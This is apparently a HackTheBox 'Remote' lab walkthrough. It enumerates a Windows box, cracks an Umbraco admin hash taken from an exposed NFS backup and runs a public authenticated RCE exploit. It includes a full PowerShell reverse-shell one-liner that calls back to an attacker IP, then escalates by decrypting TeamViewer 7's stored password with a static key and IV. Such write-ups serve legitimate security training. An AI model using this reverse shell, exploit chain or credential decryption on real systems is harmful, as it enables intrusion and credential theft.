---

title: HackTheBox - Remote
layout: post
date: 2020-09-05 23:00:00 +0800

---

![9a06155922ad0b0bd66483eca0332786.png](/images/htb-remote/ac6de7b134dc471ca00bf9edee2ed185.png)

### 0. Preface

This is one of the first write-ups I have written, as well as one of the first boxes I completed, so the write-up quality may not match the previous few write-ups on this site.

Pretty interesting box overall, nothing much to really write about here. Just some enumeration, some CVE exploits and that's it. 

In this box, we will be tackling: 

1. Mounting and enumerating NFS shares
2. Exploiting Umbraco for RCE
3. Privilege escalation using TeamViewer 7

<!--excerpt-->

---

### 1. Preliminary NMAP Scan
```bash
sudo nmap -sC -sV -O -oN nmap.txt 10.10.10.180 -p- -v
```

![577ea71cde0d052a7fafd57a693a62a4.png](/images/htb-remote/8982fd28f24d47b4bee82cae9a9eb449.png)

This seems to be a Windows box. 

FTP anonymous authentication is enabled, there is a Web Server on port 80, there is an NFS share on this, as well as SMB and WinRM enabled. 

So many things to check, so let's start with the simplest.

### 2. Anonymous FTP

Let's get into an anonymous ftp session using `ftp 10.10.10.180`

![afb7b21295ac025492a8a7dbefcf78e9.png](/images/htb-remote/f71f9bc31ecc4619a416b73500e8bb92.png)

Nothing seems to be available. Moving on... 

### 3. Web Server Enumeration

![cead511bf0fb1d22598bce60374a9cfe.png](/images/htb-remote/73a2a25449a340c0accfb7dc2116b76c.png)

Seems like a product website of some sort. Let's start by running gobuster: 

```bash
gobuster dir -u http://10.10.10.180 -w /usr/share/wordlists/dirb/common.txt
``` 

![2af0adc7fc56ab5752c20046a693dc2a.png](/images/htb-remote/de08e93d2123426ba02a40bc74d5ef95.png)

Umbraco looks interesting. A quick search on Google turns up that this is flat-file based CMS.

Accessing the `/Umbraco` directory leads us to a login page.

![8465ed40f9e8467079ebab1efbefab1f.png](/images/htb-remote/40f63fe014494cf39dfc24dda991b8a1.png)

Attempting SQL injection comes up with nothing, so let's take a look at the other open ports.

### 4. Exfiltrating NFS Files

Let's next take a look at what NFS shares are available anonymously  by using 
```bash
showmount -e 10.10.10.180
```

![58f39385e8695119ec831067fd5211b6.png](/images/htb-remote/c7ab45e399534e518f01220627bceaae.png)

Seems like we have a site_backups directory that's open to everyone. Bad idea. Let's start by mounting the NFS share to our machine and download everything, then examine the files offline.  

```bash
sudo mount -t nfs 10.10.10.180:site_backups /mnt/nfs -o nolock
```

Now use `cp -R /mnt/nfs/* /dir/of/choice/` to copy everything out. 

![fec6f1e63f9c70b9571fdc95410afd7f.png](/images/htb-remote/6a566b5811524b52b929b2177f6322d0.png)

This will take a while, so go grab a coffee or something. Once the copying is completed, let's take a look at the files inside.

### 5. Enumerating NFS Files

This seems to be a backup of the Umbraco web application. 

![d9a132fcc28fa3cf2472ecb61e8d8de7.png](/images/htb-remote/0db7c488a5fe42c7a4a5b85860dc6d30.png)

Let's start with the `/Config` folder.

![edc8760322b2a01620dfbfa443dcbc13.png](/images/htb-remote/d6e7ee156b5247bdbee20ea7b994a776.png)

Inside `umbracoSettings.config`, we can see that the username has to be an email address. 

![a53bffd9b2a2771a91216cd965b7364e.png](/images/htb-remote/532fd5cb84a84015b68ce698b7f10c72.png)
 
At this point, due to the amount of files, I decided to Google for possible leads. Searching for a bit, I stumbled upon [this forum post](https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data#comment-190162).

Specifically, we need to look for an `.sdf` file which stores Umbraco data. And hopefully credentials too. This file is located in the `/App_Data` directory, so let's go there and use `strings Umbraco.sdf` to see what we can find. 

Bingo. We got some encrypted credentials.

![74f5b0a6603c3c19cc12e124a67a5f09.png](/images/htb-remote/0040e950c6214f9996ca6c7d00ab813b.png)

### 5. Umbraco Admin Credentials
Recall that the username to login is an email address, so in this case, we are mostly interested in `admin@htb.local`. Let's try cracking the hash using JohnTheRipper.

Copy the hash (b8be16afba8c314ad33d812f22a04991b90e2aaa)to a text file, then use 

```bash
sudo john --wordlist:/usr/share/wordlists/rockyou.txt adminhash.txt
```

Success. We got the password for `admin@htb.local`

![d376f53089ddb3187c8cfe3d18ed0a1b.png](/images/htb-remote/89a67cb0d63244f883194e6ab96716b8.png)

Now let's try logging into the Umbraco CMS with `admin@htb.local:baconandcheese`. 

![ee7e975c7d38d510b630b2ef0bcdcb2c.png](/images/htb-remote/56c09106f2bc4d759e0d7d07a80ce500.png)

### 6. Umbraco RCE

While trawling Google earlier, I found an RCE exploit that works for Umbraco v7.12.4 or earlier. The POC can be found on [this Github repository](https://github.com/noraj/Umbraco-RCE). This RCE requires authentication, which we already have. 

Let's check out the Umbraco version by clicking on the Help icon on the bottom left. We have a vulnerable version of Umbraco:

![bc8ec38cef064804edc99f0c0522dc88.png](/images/htb-remote/b45f94a9cd514da1b6d20ab9a759b739.png)

Looking at the Github page, we can execute commands remotely using 

```python
python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c powershell.exe -a '-NoProfile -Command ls'
```

Looking inside the .py file, we see that the /umbraco directory is already appended for us, so we don't have to specify the Umbraco directory explicitly:

![b26c2381acf7d7717ce4b4e4a99f83a2.png](/images/htb-remote/16c1f3702d9f415d9fdb9432dc60cb28.png)

So, running the following: 
```python
python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-noprofile -command pwd'
```
...gets us this:
![b9c2d4f1d8e9f6a7814dd3f015495ab9.png](/images/htb-remote/0f8e59a7dc0b421ca564df863256a146.png)

Let's see who we are:

![fa3bd66500766eba95ea8188ec4e18d1.png](/images/htb-remote/44f26bcf576f4680aefb5011c4a79f0a.png)

Let's see if we can create any files in the inetsrv directory. 
![f0856b3f720e6046f23717b5d3695cfe.png](/images/htb-remote/453a103419594c6b8f3a31b40b4ac53a.png)

Seems like we're unable to... Enumerating the `C:\` directory with the RCE, we can see that there's a `ftp_transfer` directory.

![85db2934946a43d81543cc2473fc05f9.png](/images/htb-remote/19bc86eb634d4b72a0f61ece01b7bda6.png)

Let's try putting a file inside by using `New-Item c:\\ftp_transfer\\test.txt`

![62574e1a20ff1e510797cb35e211b73d.png](/images/htb-remote/f36f7639bd7d4546bb87f292751ff2ec.png)

Next, let's try to upload a reverse powershell.. err.. shell to the ftp_transfer directory. Create a shell.ps1 file, then use the following as the content:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.43",8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Make sure to change the IP address and port before uploading.

To upload the file to the machine, use `python3 -m http.server 8888` to open a HTTP server on the directory. Next, use `curl http://10.10.14.43:8888/shell.ps1 -outfile c:\\ftp_transfer\\shell.ps1` to download the file from our machine.

![a48d81d820c6ca470ddca44bc650efbb.png](/images/htb-remote/b54331de9d544ffaa04ff0c98eea17de.png)

Now let's setup a netcat listener to catch the shell using `nc -lvnp 8000`. Execute the shell using `c:\\ftp_transfer\\shell.ps1`.

![061b1be293ee7a438d8b9ace07f06414.png](/images/htb-remote/fd6e0b2e73204c06a852c696f8d1def4.png)

Let's grab the user flag in `c:\users\public\user.txt`.
![b6a378142abd886e72269bc085acbc35.png](/images/htb-remote/52da5d0d090046198677f0c7c74fd3f7.png)

### 7. TeamViewer Privilege Escalation
Now that we have a shell, let's see what programs are installed on this thing.

![0ace0e73d5b7f38a9db24201e433c906.png](/images/htb-remote/628868b2aec8429f96cf4093edb58413.png)

![a5a3344c8a2fedace3dba73f888f1c2f.png](/images/htb-remote/935e80d7e34d485ab27ddda8889304ea.png)

Seems to be a pretty old version of TeamViewer installed. And what do you know? There's an exploit for it. You can find an explanation of it [here](https://whynotsecurity.com/blog/teamviewer/). 

So knowing the exploit: 
- TeamViewer 7 stores the password in the registry under the value SecurityPasswordAES
- This password is encrypted with: 
	- AES-128-CBC
	- Key = 0602000000a400005253413100040000
	- IV = 0100010067244F436E6762F25EA8D704

After a bit of Googling, I found the registry key for TeamViewer under `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer`

![0ab852005aed59b4370fc2bdeac41143.png](/images/htb-remote/5948e54cd5c94d9b9ecbf3183ed5547f.png)

And narrowing it down to the value we want:
![bb80a6c6341c919b99c38ef8de066a14.png](/images/htb-remote/eda3d1238e7c4cf29a6ebd90dbcc5c9b.png)

Let's try using the code found in the [blog article earlier](https://whynotsecurity.com/blog/teamviewer/) to decrypt the password: 

![a934cc3bf9f7509651f3fda59283e90b.png](/images/htb-remote/5e0fa1150de04dd094d6b688645784b9.png)

Be sure to replace the hex_str_cipher variable with the string gotten from the machine, then run the script with `python3 decrypt.py` to get the decrypted password.

![af466254b328e6e80049107e023f2155.png](/images/htb-remote/768ecb17083549748b859eef9559cafb.png)

Alright, so let's try this password with the local administrator account. 

```powershell
Enter-PSSession 10.10.10.180 -Credential "10.10.10.180\Administrator" -Authentication Negotiate
``` 

We got root.

![855dd7985410a7eb7afb8d0570e3a500.png](/images/htb-remote/f5dbd070305849d5a9a52c7b9b9fb613.png)